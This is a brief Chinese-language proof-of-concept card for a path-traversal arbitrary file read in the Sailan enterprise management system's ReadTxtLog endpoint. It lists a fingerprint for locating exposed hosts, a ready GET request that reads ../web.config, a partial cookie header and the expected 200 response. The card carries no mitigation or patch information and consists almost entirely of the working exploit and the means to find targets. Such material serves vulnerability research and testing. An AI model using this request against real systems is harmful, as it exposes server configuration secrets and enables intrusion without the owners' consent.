# 赛蓝企业管理系统ReadTxtLog任意文件读取漏洞

- **系统**：赛蓝企业管理系统ReadTxtLog　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="www.cailsoft.com"`
- **请求**：`GET /BaseModule/SysLog/ReadTxtLog?FileName=../web.config HTTP/1.1`
- **关键头**：`Cookie: __RequestVerificationToken=EXiOGTuudShJEzYLR8AQgWCZbF2NB6_KXKrmqJJyp1cgyV6_LYy9y…`　`Priority: u=0, i`
- **预期**：200　|　—